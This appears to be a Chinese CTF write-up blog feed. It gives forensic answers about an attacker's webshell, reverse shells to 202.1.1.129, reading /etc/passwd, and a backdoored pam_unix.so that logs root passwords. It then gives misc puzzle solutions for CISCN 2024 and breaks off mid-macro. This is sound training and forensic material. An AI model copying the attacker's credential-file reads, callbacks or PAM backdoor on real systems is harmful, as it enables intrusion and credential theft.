分</h2><blockquote><p>关卡描述：黑客获取webshell时查询当前shell的权限是什么？</p></blockquote><p>继续跟<code>/static/s74e7vwmzs21d5x6.jsp</code>的流量</p><p>找到执行<code>whoami</code>的</p><p><img src="/img/wp/2024/2024ccb-quzheng-11.png"></p><p>拿返回值解密aes，再解base64</p><p><img src="/img/wp/2024/2024ccb-quzheng-9.png"></p><p><code>tomcat</code></p><h2 id="关卡09：-150-分"><a href="#关卡09：-150-分" class="headerlink" title="关卡09： 150 分"></a>关卡09： 150 分</h2><blockquote><p>关卡描述：利用webshell查询服务器Linux系统发行版本是什么？</p></blockquote><p>步骤和上一题一样</p><p>有一个包执行了<code>cat /etc/redhat-release</code>，找返回值解密即可</p><p><img src="/img/wp/2024/2024ccb-quzheng-12.png"></p><p><code>CentOS Linux release 7.4.1708 (Core)</code></p><h2 id="关卡10：-50-分"><a href="#关卡10：-50-分" class="headerlink" title="关卡10： 50 分"></a>关卡10： 50 分</h2><blockquote><p>关卡描述：黑客从服务器上下载的秘密文件的绝对路径是什么？</p></blockquote><p>shell同目录下可以看到<code>secert.file</code></p><p><img src="/img/wp/2024/2024ccb-quzheng-13.png"></p><p><code>/usr/local/tomcat/webapps/ROOT/static/secert.file</code></p><h2 id="关卡11：-50-分"><a href="#关卡11：-50-分" class="headerlink" title="关卡11： 50 分"></a>关卡11： 50 分</h2><blockquote><p>关卡描述：黑客通过反连执行的第一条命令是什么？</p></blockquote><p>找到反弹shell的地址<code>202.1.1.129:4444</code></p><p><img src="/img/wp/2024/2024ccb-quzheng-14.png"></p><p>在流量包中筛选4444端口，然后追踪流</p><p><img src="/img/wp/2024/2024ccb-quzheng-15.png"></p><p><code>cat /etc/passwd</code></p><h2 id="关卡12：-50-分"><a href="#关卡12：-50-分" class="headerlink" title="关卡12： 50 分"></a>关卡12： 50 分</h2><blockquote><p>关卡描述：黑客通过什么文件修改的root密码（绝对路径）</p></blockquote><p>图片同上</p><p><code>/etc/passwd</code></p><h2 id="关卡13：-250-分"><a href="#关卡13：-250-分" class="headerlink" title="关卡13： 250 分"></a>关卡13： 250 分</h2><blockquote><p>关卡描述：黑客设置的root密码是多少？</p></blockquote><p>爆破上上图中的hash</p><p><img src="/img/wp/2024/2024ccb-quzheng-16.png"></p><p><code>123456</code></p><h2 id="关卡14：-50-分"><a href="#关卡14：-50-分" class="headerlink" title="关卡14： 50 分"></a>关卡14： 50 分</h2><blockquote><p>关卡描述：黑客留下后门的反连的ip和port是什么？（ip:port)</p></blockquote><p>查看定时任务</p><p><img src="/img/wp/2024/2024ccb-quzheng-17.png"></p><p><code>202.1.1.129:9999</code></p><h2 id="关卡15：-150-分"><a href="#关卡15：-150-分" class="headerlink" title="关卡15： 150 分"></a>关卡15： 150 分</h2><blockquote><p>关卡描述：黑客通过后门反连执行的第一条命令是什么？</p></blockquote><p>流量过滤9999单端口</p><p><img src="/img/wp/2024/2024ccb-quzheng-18.png"></p><p><code>rpm -qa | grep pam</code></p><h2 id="关卡16：-200-分"><a href="#关卡16：-200-分" class="headerlink" title="关卡16： 200 分"></a>关卡16： 200 分</h2><blockquote><p>关卡描述：黑客通过什么文件留下了后门？</p></blockquote><p>根据上一题的命令去搜索pam相关文件</p><p>找到<code>/usr/lib/security/pam_unix.so</code>和<code>/usr/lib64/security/pam_unix.so</code></p><p>存在后门</p><p><img src="/img/wp/2024/2024ccb-quzheng-19.png"></p><p><code>pam_unix.so</code></p><h2 id="关卡17：-300-分"><a href="#关卡17：-300-分" class="headerlink" title="关卡17： 300 分"></a>关卡17： 300 分</h2><blockquote><p>关卡描述：黑客设置的后门密码是什么？</p></blockquote><p>继续往下走，直接看到密码</p><p><img src="/img/wp/2024/2024ccb-quzheng-20.png"></p><p><code>ssh_back_pwd</code></p><h2 id="关卡18：-250-分"><a href="#关卡18：-250-分" class="headerlink" title="关卡18： 250 分"></a>关卡18： 250 分</h2><blockquote><p>关卡描述：黑客的后门将root密码记录在哪个文件中？（绝对路径）</p></blockquote><p>继续向下</p><p><img src="/img/wp/2024/2024ccb-quzheng-21.png"></p><p><code>/tmp/.sshlog</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;取证溯源&quot;&gt;&lt;a href=&quot;#取证溯源&quot; class=&quot;headerlink&quot; title=&quot;取证溯源&quot;&gt;&lt;/a&gt;取证溯源&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;1、您的同事李白在运维一台部署了移动应用服务端的linux服务器时发现了异常，好像被黑客攻击了。小</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="长城杯" scheme="https://www.dr0n.top/tags/%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
    
    <category term="2024竞赛" scheme="https://www.dr0n.top/tags/2024%E7%AB%9E%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>第十七届全国大学生信息安全竞赛-创新实践能力赛初赛</title>
    <link href="https://www.dr0n.top/posts/19d58d81/"/>
    <id>https://www.dr0n.top/posts/19d58d81/</id>
    <published>2024-05-20T04:30:00.000Z</published>
    <updated>2025-07-27T10:03:37.676Z</updated>
    
    <content type="html"><![CDATA[<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power Trajectory Diagram"></a>Power Trajectory Diagram</h2><p>先将npz解压，然后将功耗转成图片分析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>ind=np.load(<span class="hljs-string">&quot;index.npy&quot;</span>)<br>p=np.load(<span class="hljs-string">&quot;trace.npy&quot;</span>)<br><br><span class="hljs-keyword">for</span> j,a <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(p):<br>    img=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">5000</span>,<span class="hljs-number">300</span>),<span class="hljs-number">255</span>)<br>    <span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>        img.putpixel((i,<span class="hljs-built_in">int</span>(v*<span class="hljs-number">100</span>)+<span class="hljs-number">150</span>),<span class="hljs-number">0</span>)<br>    img.save(<span class="hljs-string">&quot;output/%s.png&quot;</span>%j)<br></code></pre></td></tr></table></figure><p>将四十张图片一组，找到不同的图片，然后在输入的表中找到索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-comment"># 读取数组</span><br><span class="hljs-built_in">print</span>(np.load(<span class="hljs-string">&#x27;input.npy&#x27;</span>))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[&#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27;</span><br><span class="hljs-string"> &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27;</span><br><span class="hljs-string"> &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27;</span><br><span class="hljs-string"> &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27;</span><br><span class="hljs-string"> &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27;</span><br><span class="hljs-string"> &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27;</span><br><span class="hljs-string"> &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27;</span><br><span class="hljs-string"> &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27;</span><br><span class="hljs-string"> &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27;</span><br><span class="hljs-string"> &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27;</span><br><span class="hljs-string"> &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27;</span><br><span class="hljs-string"> &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27;</span><br><span class="hljs-string"> &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27;</span><br><span class="hljs-string"> &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27;</span><br><span class="hljs-string"> &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27;</span><br><span class="hljs-string"> &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27;</span><br><span class="hljs-string"> &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27;</span><br><span class="hljs-string"> &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27;</span><br><span class="hljs-string"> &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27;</span><br><span class="hljs-string"> &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27;</span><br><span class="hljs-string"> &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27;</span><br><span class="hljs-string"> &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27;</span><br><span class="hljs-string"> &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27;</span><br><span class="hljs-string"> &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27;</span><br><span class="hljs-string"> &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27; &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27;</span><br><span class="hljs-string"> &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27; &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27;</span><br><span class="hljs-string"> &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27; &#x27;a&#x27; &#x27;b&#x27; &#x27;c&#x27; &#x27;d&#x27; &#x27;e&#x27; &#x27;f&#x27;</span><br><span class="hljs-string"> &#x27;g&#x27; &#x27;h&#x27; &#x27;i&#x27; &#x27;j&#x27; &#x27;k&#x27; &#x27;l&#x27; &#x27;m&#x27; &#x27;n&#x27; &#x27;o&#x27; &#x27;p&#x27; &#x27;q&#x27; &#x27;r&#x27; &#x27;s&#x27; &#x27;t&#x27; &#x27;u&#x27; &#x27;v&#x27; &#x27;w&#x27; &#x27;x&#x27;</span><br><span class="hljs-string"> &#x27;y&#x27; &#x27;z&#x27; &#x27;0&#x27; &#x27;1&#x27; &#x27;2&#x27; &#x27;3&#x27; &#x27;4&#x27; &#x27;5&#x27; &#x27;6&#x27; &#x27;7&#x27; &#x27;8&#x27; &#x27;9&#x27; &#x27;_&#x27; &#x27;!&#x27; &#x27;@&#x27; &#x27;#&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>对比后得到登录密码<code>_ciscn_2024_</code></p><h2 id="火锅链观光打卡"><a href="#火锅链观光打卡" class="headerlink" title="火锅链观光打卡"></a>火锅链观光打卡</h2><p>连接MetaMask后开始游戏</p><p><img src="/img/wp/2024/2024ciscn-%E7%81%AB%E9%94%85%E9%93%BE%E8%A7%82%E5%85%89%E6%89%93%E5%8D%A1-1.png"></p><p><img src="/img/wp/2024/2024ciscn-%E7%81%AB%E9%94%85%E9%93%BE%E8%A7%82%E5%85%89%E6%89%93%E5%8D%A1-2.png"></p><h2 id="神秘文件"><a href="#神秘文件" class="headerlink" title="神秘文件"></a>神秘文件</h2><p>PPT第三页</p><p><code>UGF5dDQ6NmYtNDA=</code>解base64得到<code>Payt4:6f-40</code></p><p><img src="/img/wp/2024/2024ciscn-%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6-1.png"></p><p>PPT第五页</p><p>备注中的字符串循环解密base64得到<code>pArt5:5f-90d</code></p><p>左上角的<code>UGFyVDY6ZC0y</code>base64解密得到<code>ParT6:d-2</code></p><p><img src="/img/wp/2024/2024ciscn-%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6-2.png"></p><p>在<code>ppt\slides\slide4.xml</code>中找到第七部分</p><p>ROT13然后base64 <code>PART7=22b3</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p:cNvPr</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;4&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;HRSFIQp9ZwWvZj==&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:cNvPr</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;5&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ROT13(All)&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>ppt\slideLayouts\slideLayout2.xml</code>或者幻灯片母版中可以看到第八部分</p><p>去除B,b,1,3后base64  <code>paRt8:87e</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a:t</span>&gt;</span>c1GFSbd3Dg6BODbdl<span class="hljs-tag">&lt;/<span class="hljs-name">a:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a:t</span>&gt;</span>Remove All <span class="hljs-tag">&lt;/<span class="hljs-name">a:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a:t</span>&gt;</span>’B ’/’b’ /’1 ’/’3’<span class="hljs-tag">&lt;/<span class="hljs-name">a:t</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>ppt\media\image57.jpg</code>底部存在密文，base64解密得到<code>parT9:dee</code></p><p><img src="/img/wp/2024/2024ciscn-%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6-3.png"></p><p>在<code>ppt\comments\comment1.xml</code>中得到第十部分</p><p>维吉尼亚后base64 <code>PARt10:9&#125;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>ZYWJbIYnFhq9<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>What is this？<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Vigenere cipher is good！<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Aha，the key is<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Is what？<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>furry<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>🆗<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在<code>docProps\app.xml</code>得到加密方式，<code>docProps\core.xml</code>得到密文和密钥</p><p>Bifid解密后base64 <code>Part1:flag&#123;e</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span>&gt;</span>Bifid cipher<span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dc:title</span>&gt;</span>这是一个标题 QFCfpPQ6ZymuM3gq<span class="hljs-tag">&lt;/<span class="hljs-name">dc:title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dc:creator</span>&gt;</span>Administrator;Key:lanjing<span class="hljs-tag">&lt;/<span class="hljs-name">dc:creator</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将<code>ppt\embeddings\Microsoft_Word_Document.docx</code>改成zip解压</p><p><code>word\document.xml</code>得到第二部分</p><p>凯撒偏移10后base64 <code>part2:675efb</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>这<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>o<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>ffset:10<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>里<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>原来似乎有什么，后来好像被小C<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>aesar<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>抱走了！<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">w:t</span>&gt;</span>mQPinNS6Xtm1JGJs<span class="hljs-tag">&lt;/<span class="hljs-name">w:t</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在PPT中打开宏编辑器</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Sub</span> crypto(sMessage, strKey)<br>    <span class="hljs-keyword">Dim</span> kLen, x, y, i, j, temp<br>    <span class="hljs-keyword">Dim</span> s(<span class="hljs-number">256</span>), k(<span class="hljs-number">256</span>)<br><br>    kLen = Len(strKey)<br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">0</span> <span class="hljs-keyword">To</span> <span class="hljs-number">255</span><br>        s(i) = i<br>        k(i) = Asc(<span class="hljs-keyword">Mid</span>(strKey, (i <span class="hljs-built_in">Mod</span> kLen) + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">Next</span><br><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">0</span> <span class="hljs-keyword">To</span> <span class="hljs-number">255</span><br>        j = (j + k(i) + s(i)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(i)<br>        s(i) = s(j)<br>        